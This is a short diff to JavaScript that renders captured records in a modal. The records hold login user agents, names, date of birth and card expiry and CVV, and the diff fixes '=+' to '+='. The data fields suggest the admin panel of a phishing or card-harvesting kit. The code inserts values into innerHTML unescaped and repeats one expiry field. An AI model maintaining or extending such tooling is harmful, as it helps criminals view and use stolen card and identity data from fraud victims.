@@ -162,7 +162,7 @@
             <li class="list-group-item">UserAgent: ${details.getUserDataLogin.userAgent || 'N/A'}</li> </ul>
    </div>`;
                    } else if(details.getUserDataDetails){
-                   modalBody.innerHTML =+  `<div class="card">
+                   modalBody.innerHTML +=  `<div class="card">
         <ul class="list-group list-group-flush">
             <li class="list-group-item">Fist Name: ${details.getUserDataDetails.fname || 'N/A'}</li>
             <li class="list-group-item">Last Name: ${details.getUserDataDetails.lname || 'N/A'}</li>
@@ -170,7 +170,7 @@
             <li class="list-group-item">DOB: ${details.getUserDataDetails.dob1 || 'N/A'}/${details.getUserDataDetails.dob2 || 'N/A'}/${details.getUserDataDetails.dob3 || 'N/A'}</li>
             </ul></div>`;
                    } else if(details.getUserDataCard){
-         modalBody.innerHTML =+ ` <div class="card"> <ul class="list-group list-group-flush
+         modalBody.innerHTML += ` <div class="card"> <ul class="list-group list-group-flush
           <li class="list-group-item">Exp: ${details.getUserDataCard.exp1 || 'N/A'}/${details.getUserDataCard.exp1 || 'N/A'}</li>
             <li class="list-group-item">Cvv: ${details.getUserDataCard.cvv || 'N/A'}</li>
         </ul> </div>`;
